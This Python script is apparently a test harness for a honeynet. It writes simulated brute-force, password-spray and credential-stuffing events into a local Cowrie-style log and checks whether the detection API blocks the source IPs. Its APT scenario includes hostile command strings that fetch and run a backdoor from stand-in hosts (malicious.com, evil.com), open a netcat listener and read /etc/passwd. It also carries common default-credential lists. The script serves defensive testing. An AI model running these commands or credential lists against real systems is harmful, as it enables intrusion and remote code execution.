#!/usr/bin/env python3
"""
Digital Twin Honeynet - Attack Simulator 4
TC4: Brute Force Attack Testing (Obvious Malicious Behavior)
"""

import time
import random
import requests
import json
import logging
import argparse
from datetime import datetime
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

class BruteForceSimulator:
    """Simulates brute force attacks for testing"""
    
    def __init__(self, target_host='localhost', target_port=22, api_url='http://localhost:8000'):
        self.target_host = target_host
        self.target_port = target_port
        self.api_url = api_url
        
        # Common attack usernames and passwords
        self.attack_usernames = [
            'admin', 'root', 'test', 'guest', 'user', 'ubuntu', 'centos',
            'debian', 'pi', 'raspberry', 'docker', 'jenkins', 'git',
            'mysql', 'postgres', 'oracle', 'webmaster', 'administrator'
        ]
        
        self.attack_passwords = [
            'password', '123456', 'admin', 'root', 'test', 'guest',
            'ubuntu', 'centos', 'debian', 'raspberry', 'docker',
            'password123', 'admin123', 'root123', 'test123',
            'qwerty', 'abc123', '123123', 'letmein', 'welcome'
        ]
        
        # Brute force scenarios
        self.brute_force_scenarios = {
            'classic_brute_force': {
                'name': 'Classic Brute Force',
                'attempts': 15,
                'delay': 0.1,
                'description': 'Rapid attempts with common credentials'
            },
            'dictionary_attack': {
                'name': 'Dictionary Attack',
                'attempts': 25,
                'delay': 0.2,
                'description': 'Systematic password dictionary attack'
            },
            'username_enumeration': {
                'name': 'Username Enumeration',
                'attempts': 20,
                'delay': 0.3,
                'description': 'Testing multiple usernames with same password'
            },
            'password_spray': {
                'name': 'Password Spray Attack',
                'attempts': 30,
                'delay': 0.1,
                'description': 'Testing same password across multiple users'
            },
            'credential_stuffing': {
                'name': 'Credential Stuffing',
                'attempts': 40,
                'delay': 0.1,
                'description': 'Using leaked credentials'
            }
        }
        
        logger.info(f"Brute force simulator initialized for {target_host}:{target_port}")
        
    def simulate_classic_brute_force(self):
        """Simulate classic brute force attack"""
        scenario = self.brute_force_scenarios['classic_brute_force']
        logger.info(f"Testing: {scenario['name']}")
        
        src_ip = self.get_attack_ip()
        
        for i in range(scenario['attempts']):
            username = random.choice(self.attack_usernames)
            password = random.choice(self.attack_passwords)
            
            log_entry = {
                'eventid': 'cowrie.login.failed',
                'timestamp': datetime.now().isoformat(),
                'src_ip': src_ip,
                'username': username,
                'password': password,
                'session': f'classic_bf_{i:02d}',
                'message': f'Classic brute force attempt {i+1}/{scenario["attempts"]}: {username}/{password}'
            }
            
            self.write_log_entry(log_entry)
            logger.info(f"  Attempt {i+1}/{scenario['attempts']}: {username}/{password}")
            
            time.sleep(scenario['delay'])
            
        logger.info(f"  Expected: IP blocked for brute force attack")
        
    def simulate_dictionary_attack(self):
        """Simulate dictionary attack"""
        scenario = self.brute_force_scenarios['dictionary_attack']
        logger.info(f"Testing: {scenario['name']}")
        
        src_ip = self.get_attack_ip()
        target_username = 'admin'  # Focus on one username
        
        # Use dictionary of passwords
        dictionary_passwords = [
            'password', '123456', 'admin', 'root', 'test', 'guest',
            'ubuntu', 'centos', 'debian', 'raspberry', 'docker',
            'password123', 'admin123', 'root123', 'test123',
            'qwerty', 'abc123', '123123', 'letmein', 'welcome',
            'monkey', 'dragon', 'master', 'freedom', 'whatever'
        ]
        
        for i, password in enumerate(dictionary_passwords[:scenario['attempts']]):
            log_entry = {
                'eventid': 'cowrie.login.failed',
                'timestamp': datetime.now().isoformat(),
                'src_ip': src_ip,
                'username': target_username,
                'password': password,
                'session': f'dict_attack_{i:02d}',
                'message': f'Dictionary attack attempt {i+1}: {target_username}/{password}'
            }
            
            self.write_log_entry(log_entry)
            logger.info(f"  Dictionary attempt {i+1}: {target_username}/{password}")
            
            time.sleep(scenario['delay'])
            
        logger.info(f"  Expected: IP blocked for dictionary attack")
        
    def simulate_username_enumeration(self):
        """Simulate username enumeration attack"""
        scenario = self.brute_force_scenarios['username_enumeration']
        logger.info(f"Testing: {scenario['name']}")
        
        src_ip = self.get_attack_ip()
        test_password = 'password'  # Use same password for all attempts
        
        # Test multiple usernames
        test_usernames = [
            'admin', 'root', 'test', 'guest', 'user', 'ubuntu', 'centos',
            'debian', 'pi', 'raspberry', 'docker', 'jenkins', 'git',
            'mysql', 'postgres', 'oracle', 'webmaster', 'administrator',
            'system', 'service', 'daemon', 'nobody', 'operator'
        ]
        
        for i, username in enumerate(test_usernames[:scenario['attempts']]):
            log_entry = {
                'eventid': 'cowrie.login.failed',
                'timestamp': datetime.now().isoformat(),
                'src_ip': src_ip,
                'username': username,
                'password': test_password,
                'session': f'user_enum_{i:02d}',
                'message': f'Username enumeration attempt {i+1}: {username}/{test_password}'
            }
            
            self.write_log_entry(log_entry)
            logger.info(f"  Enumeration attempt {i+1}: {username}/{test_password}")
            
            time.sleep(scenario['delay'])
            
        logger.info(f"  Expected: IP blocked for username enumeration")
        
    def simulate_password_spray(self):
        """Simulate password spray attack"""
        scenario = self.brute_force_scenarios['password_spray']
        logger.info(f"Testing: {scenario['name']}")
        
        src_ip = self.get_attack_ip()
        spray_password = 'admin123'  # Spray this password across users
        
        # Spray across multiple users
        spray_usernames = [
            'admin', 'root', 'test', 'guest', 'user', 'ubuntu', 'centos',
            'debian', 'pi', 'raspberry', 'docker', 'jenkins', 'git',
            'mysql', 'postgres', 'oracle', 'webmaster', 'administrator',
            'system', 'service', 'daemon', 'nobody', 'operator',
            'backup', 'monitor', 'support', 'helpdesk', 'info'
        ]
        
        for i, username in enumerate(spray_usernames[:scenario['attempts']]):
            log_entry = {
                'eventid': 'cowrie.login.failed',
                'timestamp': datetime.now().isoformat(),
                'src_ip': src_ip,
                'username': username,
                'password': spray_password,
                'session': f'password_spray_{i:02d}',
                'message': f'Password spray attempt {i+1}: {username}/{spray_password}'
            }
            
            self.write_log_entry(log_entry)
            logger.info(f"  Spray attempt {i+1}: {username}/{spray_password}")
            
            time.sleep(scenario['delay'])
            
        logger.info(f"  Expected: IP blocked for password spray attack")
        
    def simulate_credential_stuffing(self):
        """Simulate credential stuffing attack"""
        scenario = self.brute_force_scenarios['credential_stuffing']
        logger.info(f"Testing: {scenario['name']}")
        
        src_ip = self.get_attack_ip()
        
        # Simulated leaked credentials
        leaked_credentials = [
            ('admin', 'admin123'),
            ('root', 'password'),
            ('user', '123456'),
            ('test', 'test123'),
            ('guest', 'guest'),
            ('ubuntu', 'ubuntu'),
            ('centos', 'centos'),
            ('debian', 'debian'),
            ('pi', 'raspberry'),
            ('docker', 'docker'),
            ('jenkins', 'jenkins'),
            ('git', 'git'),
            ('mysql', 'mysql'),
            ('postgres', 'postgres'),
            ('oracle', 'oracle'),
            ('webmaster', 'webmaster'),
            ('administrator', 'administrator'),
            ('system', 'system'),
            ('service', 'service'),
            ('daemon', 'daemon'),
            ('nobody', 'nobody'),
            ('operator', 'operator'),
            ('backup', 'backup'),
            ('monitor', 'monitor'),
            ('support', 'support'),
            ('helpdesk', 'helpdesk'),
            ('info', 'info'),
            ('admin', 'password123'),
            ('root', 'root123'),
            ('user', 'user123'),
            ('test', 'test123'),
            ('guest', 'guest123'),
            ('ubuntu', 'ubuntu123'),
            ('centos', 'centos123'),
            ('debian', 'debian123'),
            ('pi', 'pi123'),
            ('docker', 'docker123'),
            ('jenkins', 'jenkins123'),
            ('git', 'git123')
        ]
        
        for i, (username, password) in enumerate(leaked_credentials[:scenario['attempts']]):
            log_entry = {
                'eventid': 'cowrie.login.failed',
                'timestamp': datetime.now().isoformat(),
                'src_ip': src_ip,
                'username': username,
                'password': password,
                'session': f'cred_stuff_{i:02d}',
                'message': f'Credential stuffing attempt {i+1}: {username}/{password}'
            }
            
            self.write_log_entry(log_entry)
            logger.info(f"  Stuffing attempt {i+1}: {username}/{password}")
            
            time.sleep(scenario['delay'])
            
        logger.info(f"  Expected: IP blocked for credential stuffing")
        
    def simulate_multi_ip_attack(self):
        """Simulate brute force attack from multiple IPs"""
        logger.info("Testing: Multi-IP Brute Force Attack")
        
        attack_ips = [
            '203.0.113.10',
            '198.51.100.20',
            '192.0.2.30',
            '203.0.113.40',
            '198.51.100.50'
        ]
        
        for ip_index, src_ip in enumerate(attack_ips):
            logger.info(f"  Attack from IP {ip_index+1}: {src_ip}")
            
            # Each IP performs a smaller attack
            for i in range(8):  # 8 attempts per IP
                username = random.choice(self.attack_usernames)
                password = random.choice(self.attack_passwords)
                
                log_entry = {
                    'eventid': 'cowrie.login.failed',
                    'timestamp': datetime.now().isoformat(),
                    'src_ip': src_ip,
                    'username': username,
                    'password': password,
                    'session': f'multi_ip_{ip_index}_{i:02d}',
                    'message': f'Multi-IP attack: {src_ip} attempt {i+1}: {username}/{password}'
                }
                
                self.write_log_entry(log_entry)
                time.sleep(0.2)
                
        logger.info("  Expected: Multiple IPs blocked for coordinated attack")
        
    def simulate_advanced_persistence(self):
        """Simulate advanced persistent threat with brute force"""
        logger.info("Testing: Advanced Persistent Threat (APT) with Brute Force")
        
        src_ip = self.get_attack_ip()
        session_id = f'apt_session_{random.randint(1000, 9999)}'
        
        # Phase 1: Initial reconnaissance
        logger.info("  Phase 1: Reconnaissance")
        recon_commands = ['whoami', 'uname -a', 'cat /etc/passwd', 'ps aux']
        
        for i, command in enumerate(recon_commands):
            command_log = {
                'eventid': 'cowrie.command.input',
                'timestamp': datetime.now().isoformat(),
                'src_ip': src_ip,
                'session': session_id,
                'input': command,
                'message': f'APT reconnaissance command {i+1}: {command}'
            }
            self.write_log_entry(command_log)
            time.sleep(1.0)
            
        # Phase 2: Brute force attempts
        logger.info("  Phase 2: Brute Force Attempts")
        for i in range(12):
            username = random.choice(self.attack_usernames)
            password = random.choice(self.attack_passwords)
            
            log_entry = {
                'eventid': 'cowrie.login.failed',
                'timestamp': datetime.now().isoformat(),
                'src_ip': src_ip,
                'username': username,
                'password': password,
                'session': session_id,
                'message': f'APT brute force attempt {i+1}: {username}/{password}'
            }
            
            self.write_log_entry(log_entry)
            time.sleep(0.3)
            
        # Phase 3: Malicious commands after potential success
        logger.info("  Phase 3: Malicious Commands")
        malicious_commands = [
            'wget http://malicious.com/backdoor.sh',
            'curl -O http://evil.com/payload',
            'nc -l 4444',
            'chmod +x backdoor.sh && ./backdoor.sh'
        ]
        
        for i, command in enumerate(malicious_commands):
            command_log = {
                'eventid': 'cowrie.command.input',
                'timestamp': datetime.now().isoformat(),
                'src_ip': src_ip,
                'session': session_id,
                'input': command,
                'message': f'APT malicious command {i+1}: {command}'
            }
            self.write_log_entry(command_log)
            time.sleep(2.0)
            
        logger.info("  Expected: IP blocked for APT behavior")
        
    def get_attack_ip(self):
        """Get an attack IP address"""
        attack_ips = [
            '203.0.113.10',
            '198.51.100.20',
            '192.0.2.30',
            '203.0.113.40',
            '198.51.100.50',
            '192.0.2.60',
            '203.0.113.70',
            '198.51.100.80'
        ]
        return random.choice(attack_ips)
        
    def write_log_entry(self, log_entry):
        """Write log entry to Cowrie log file"""
        try:
            # Ensure logs directory exists
            Path('honeypot/logs').mkdir(parents=True, exist_ok=True)
            
            # Write to Cowrie-style JSON log
            with open('honeypot/logs/cowrie.json', 'a') as f:
                f.write(json.dumps(log_entry) + '\n')
                
        except Exception as e:
            logger.error(f"Error writing log entry: {e}")
            
    def test_api_connectivity(self):
        """Test connectivity to the security API"""
        try:
            response = requests.get(f"{self.api_url}/health", timeout=5)
            if response.status_code == 200:
                logger.info("✓ API connectivity test passed")
                return True
            else:
                logger.error(f"✗ API connectivity test failed: {response.status_code}")
                return False
        except Exception as e:
            logger.error(f"✗ API connectivity test failed: {e}")
            return False
            
    def get_system_status(self):
        """Get current system status"""
        try:
            response = requests.get(f"{self.api_url}/status", timeout=5)
            if response.status_code == 200:
                status = response.json()
                logger.info("System Status:")
                logger.info(f"  - Total requests: {status.get('stats', {}).get('total_requests', 0)}")
                logger.info(f"  - Blocked IPs: {status.get('stats', {}).get('blocked_ips', 0)}")
                logger.info(f"  - Alerts: {status.get('stats', {}).get('alerts', 0)}")
                return status
            else:
                logger.error(f"Failed to get status: {response.status_code}")
                return None
        except Exception as e:
            logger.error(f"Error getting status: {e}")
            return None
            
    def run_brute_force_test(self):
        """Run comprehensive brute force test"""
        logger.info("=" * 60)
        logger.info("🧪 TC4: Brute Force Attack Testing")
        logger.info("=" * 60)
        
        # Test API connectivity first
        if not self.test_api_connectivity():
            logger.error("Cannot connect to API. Make sure the honeynet system is running.")
            return
            
        # Get initial status
        logger.info("Initial system status:")
        initial_status = self.get_system_status()
        
        # Run brute force tests
        logger.info("\n--- Brute Force Attack Scenarios ---")
        
        # Test classic brute force
        self.simulate_classic_brute_force()
        time.sleep(5)
        
        # Test dictionary attack
        self.simulate_dictionary_attack()
        time.sleep(5)
        
        # Test username enumeration
        self.simulate_username_enumeration()
        time.sleep(5)
        
        # Test password spray
        self.simulate_password_spray()
        time.sleep(5)
        
        # Test credential stuffing
        self.simulate_credential_stuffing()
        time.sleep(5)
        
        # Test multi-IP attack
        self.simulate_multi_ip_attack()
        time.sleep(5)
        
        # Test APT with brute force
        self.simulate_advanced_persistence()
        time.sleep(5)
        
        # Get final status
        logger.info("\nFinal system status:")
        final_status = self.get_system_status()
        
        # Analyze results
        if initial_status and final_status:
            initial_blocked = initial_status.get('stats', {}).get('blocked_ips', 0)
            final_blocked = final_status.get('stats', {}).get('blocked_ips', 0)
            blocked_increase = final_blocked - initial_blocked
            
            logger.info("\n--- Brute Force Attack Analysis Results ---")
            logger.info(f"Initial blocked IPs: {initial_blocked}")
            logger.info(f"Final blocked IPs: {final_blocked}")
            logger.info(f"IPs blocked during test: {blocked_increase}")
            
            if blocked_increase > 0:
                logger.info("✅ SUCCESS: System detected and blocked brute force attacks!")
                logger.info("✅ IPs were properly blocked for malicious behavior")
            else:
                logger.error("❌ FAILURE: System failed to block brute force attacks!")
                logger.error("   No IPs were blocked despite obvious malicious behavior")
                
        logger.info("\n✅ Brute force attack testing completed!")

def main():
    """Main entry point"""
    parser = argparse.ArgumentParser(description='TC4: Brute Force Attack Simulator')
    parser.add_argument('--target', default='localhost', help='Target host (default: localhost)')
    parser.add_argument('--port', type=int, default=22, help='Target port (default: 22)')
    parser.add_argument('--api-url', default='http://localhost:8000', help='API URL (default: http://localhost:8000)')
    parser.add_argument('--scenario', choices=['all', 'classic', 'dictionary', 'enumeration', 'spray', 'stuffing', 'multi_ip', 'apt'], 
                       default='all', help='Specific scenario to test (default: all)')
    parser.add_argument('--attempts', type=int, default=15, help='Number of attempts per scenario (default: 15)')
    parser.add_argument('--delay', type=float, default=0.1, help='Delay between attempts (default: 0.1s)')
    
    args = parser.parse_args()
    
    # Create simulator
    simulator = BruteForceSimulator(args.target, args.port, args.api_url)
    
    # Run test
    simulator.run_brute_force_test()
    
    logger.info("Brute force attack simulation completed!")

if __name__ == "__main__":
    main() 